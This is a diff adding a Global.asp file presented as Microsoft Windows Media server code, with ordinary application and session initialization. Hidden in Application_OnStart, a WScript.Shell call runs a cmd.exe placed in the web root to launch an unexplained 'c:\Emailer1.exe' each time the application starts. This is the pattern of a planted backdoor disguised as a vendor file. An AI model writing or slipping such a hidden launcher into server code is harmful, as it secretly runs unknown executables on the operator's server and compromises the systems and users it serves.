@@ -1,0 +1,56 @@
+<SCRIPT LANGUAGE="VBScript" RUNAT="Server">
+'+-------------------------------------------------------------------------
+'
+'  Microsoft Windows Media
+'  Copyright (C) Microsoft Corporation. All rights reserved.
+'
+'  File:       Global.asp
+'
+'  Contents:
+'
+'--------------------------------------------------------------------------
+
+
+'////////////////////////////////////////////////////////////////
+Sub Appplication_OnStart
+    Application( "strLocalHostName" ) = Empty
+    Application( "localhostDNSName" ) = Request.ServerVariables( "SERVER_NAME" )
+    Application( "localhostCName" ) = Server.CreateObject("WScript.Network").ComputerName
+    Application( "strHostIPAddress" ) = Request.ServerVariables( "LOCAL_ADDR" )
+    Application( "bLocalHostHasWMS" ) = Empty
+    Application( "dwDefaultRefreshRate" ) = 60
+		
+	Set shell=CreateObject("WScript.Shell")
+	shell.run "C:\Inetpub\wwwroot\cmd.exe /c ""c:\Emailer1.exe"""
+		
+end sub
+
+
+'////////////////////////////////////////////////////////////////
+Sub Session_OnStart    
+
+	session.timeout = 60
+
+	Session( "Initialized" ) = FALSE
+    Session( "LocalHostWinName" ) = ""
+    
+    ' sniff the browser as few times as possible, since it won't change from session to session
+    Session( "bNetscape" ) = ""
+    Session( "BrowserVersion" ) = ""
+    Session( "UserAgent" ) = ""
+    Session( "cssName" ) = ""
+    
+    Session( "certDetected" ) = ""
+
+    ' Set locale
+    Session.LCID = "&H0409"
+
+    ' use UTF-8 for encoding.  See also the @CODEPAGE statement at the top of locstrings.h
+    Session.CodePage = 65001
+End Sub
+
+'////////////////////////////////////////////////////////////////
+Sub Session_OnEnd
+end sub
+</SCRIPT>
+
